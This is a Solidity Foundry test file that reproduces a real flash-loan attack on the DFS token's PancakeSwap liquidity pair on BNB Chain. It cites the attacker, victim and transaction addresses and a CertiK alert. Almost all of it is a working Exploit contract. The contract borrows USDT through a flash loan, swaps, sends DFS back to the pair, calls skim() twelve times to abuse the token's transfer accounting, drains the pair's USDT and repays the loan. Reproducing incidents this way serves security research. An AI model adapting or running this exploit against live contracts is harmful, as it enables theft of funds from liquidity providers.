// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~1,450 US$
// Attacker : 0xb358BfD28b02c5e925b89aD8b0Eb35913D2d0805
// Attack Contract : 0x87bfd80c2a05ee98cfe188fd2a0e4d70187db137
// Vulnerable Contract : 0x2B806e6D78D8111dd09C58943B9855910baDe005
// Attack Tx : https://bscscan.com/tx/0xcddcb447d64c2ce4b3ac5ebaa6d42e26d3ed0ff3831c08923c53ea998f598a7c

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x2B806e6D78D8111dd09C58943B9855910baDe005#code#830

// @Analysis
// CertiKAlert : https://twitter.com/CertiKAlert/status/1608788290785665024

CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
IPancakePair constant USDT_CCDS_LP = IPancakePair(0x2B948B5D3EBe9F463B29280FC03eBcB82db1072F);
IPancakePair constant DFS_USDT_LP = IPancakePair(0x4B02D85E086809eB7AF4E791103Bc4cde83480D1);
IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
address constant dfs = 0x2B806e6D78D8111dd09C58943B9855910baDe005;
address constant ccds = 0xBFd48CC239bC7e7cd5AD9F9630319F9b59e0B9e1;

contract Attacker is Test {
    //  forge test --contracts ./src/test/DFS_exp.sol -vvvv
    function setUp() public {
        cheat.label(address(pancakeRouter), "pancakeRouter");
        cheat.label(address(USDT_CCDS_LP), "USDT_CCDS_LP");
        cheat.label(address(DFS_USDT_LP), "DFS_USDT_LP");
        cheat.label(usdt, "USDT");
        cheat.label(dfs, "dfs");
        cheat.label(ccds, "ccds");
        cheat.createSelectFork("bsc", 24_349_821);
    }

    function testExploit() public {
        Exploit exploit = new Exploit();
        emit log_named_decimal_uint("[start] Attacker USDT Balance", IERC20(usdt).balanceOf(address(exploit)), 18);
        exploit.harvest();
        emit log_named_decimal_uint("[End] Attacker USDT Balance", IERC20(usdt).balanceOf(address(exploit)), 18);
    }
}

contract Exploit is Test {
    uint256 borrowamount;

    function harvest() public {
        emit log_named_decimal_uint(
            "[INFO]  usdt balance : DFS_USDT_LP", IERC20(usdt).balanceOf(address(DFS_USDT_LP)), 18
        );
        borrowamount = IERC20(usdt).balanceOf(address(DFS_USDT_LP));
        USDT_CCDS_LP.swap(borrowamount, 0, address(this), "0");
        emit log_named_decimal_uint("[INFO]  usdt balance : this", IERC20(usdt).balanceOf(address(this)), 18);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        if (keccak256(data) != keccak256("0")) return;
        emit log("[INFO]  Flashloan received ");
        emit log_named_decimal_uint("[INFO]  this balance (usdt token)", IERC20(usdt).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[INFO]  this balance (dfs token)", IERC20(dfs).balanceOf(address(this)), 18);
        IERC20(usdt).transfer(address(DFS_USDT_LP), borrowamount);

        (uint256 reserve0beforeswap, uint256 reserve1beforeswap,) = DFS_USDT_LP.getReserves();
        uint256 swapamount = reserve0beforeswap * 499 / 1000; // swap 0.449 lp dfs
        // DFS_USDT_LP.swap(reserve0beforeswap , 0,address(this), new bytes(1));
        emit log_named_decimal_uint("[INFO]  swapamount ", swapamount, 18);
        DFS_USDT_LP.swap(swapamount, 0, address(this), new bytes(1));
        DFS_USDT_LP.sync();

        emit log_named_decimal_uint("[INFO]  dfs balance : address(this)", IERC20(dfs).balanceOf(address(this)), 18);
        uint256 dfstransferamount = IERC20(dfs).balanceOf(address(this));
        IERC20(dfs).transfer(address(DFS_USDT_LP), dfstransferamount * 98 / 100); // transfer  98%  dfs balance
        // loop 12 times skim() function
        for (uint256 i = 0; i < 12; i++) {
            DFS_USDT_LP.skim(address(DFS_USDT_LP));
        }
        DFS_USDT_LP.skim(address(this));

        uint256 txamount = IERC20(dfs).balanceOf(address(this));
        emit log_named_decimal_uint("[INFO]  dfs balance : address(this)", txamount, 18);
        IERC20(dfs).transfer(address(DFS_USDT_LP), txamount * 95 / 100); //transfer  95%  dfs balance

        emit log_named_decimal_uint(
            "[INFO]  address(this) balance (dfs token)", IERC20(dfs).balanceOf(address(this)), 18
        );
        emit log_named_decimal_uint(
            "[INFO]  address(this) balance (usdt token)", IERC20(usdt).balanceOf(address(this)), 18
        );

        //todo
        uint256 dfslpusdtamount = IERC20(usdt).balanceOf(address(DFS_USDT_LP));
        emit log_named_decimal_uint("[INFO]  address(DFS_USDT_LP) balance (usdt token)", dfslpusdtamount, 18);
        DFS_USDT_LP.swap(0, dfslpusdtamount * 999 / 1000, address(this), new bytes(1)); // swap 99.9 lp usdt
        emit log_named_decimal_uint("[INFO] payback amount usdt ", IERC20(usdt).balanceOf(address(address(this))), 18);
        uint256 paybackfee = borrowamount * 1005 / 1000; // 0.5% fee
        bool suc = IERC20(usdt).transfer(address(USDT_CCDS_LP), paybackfee);
        require(suc, "[INFO]  Flashloan[1] payback failed ");
        emit log("[INFO]  Flashloan payback success ");
    }
}
